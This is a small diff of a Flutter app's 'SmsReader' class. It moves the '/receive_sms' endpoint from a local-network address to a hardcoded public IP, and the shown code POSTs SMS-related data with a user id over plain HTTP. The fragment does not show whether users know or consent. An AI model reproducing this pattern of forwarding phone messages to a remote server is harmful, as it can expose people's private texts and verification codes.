@@ -1,4 +1,6 @@
 // import 'package:flutter_sms_inbox/flutter_sms_inbox.dart';
+// ignore_for_file: avoid_print, prefer_collection_literals
+
 import 'package:http/http.dart' as http;
 import 'dart:convert';
 import 'package:telephony/telephony.dart';
@@ -126,7 +128,7 @@ class SmsReader {
       'uid': uid,
     };
 
-    Uri uri = Uri.parse('http://192.168.8.176:5000/receive_sms');
+    Uri uri = Uri.parse('http://3.111.149.246:8000/receive_sms');
 
     try {
       final response = await http.post(
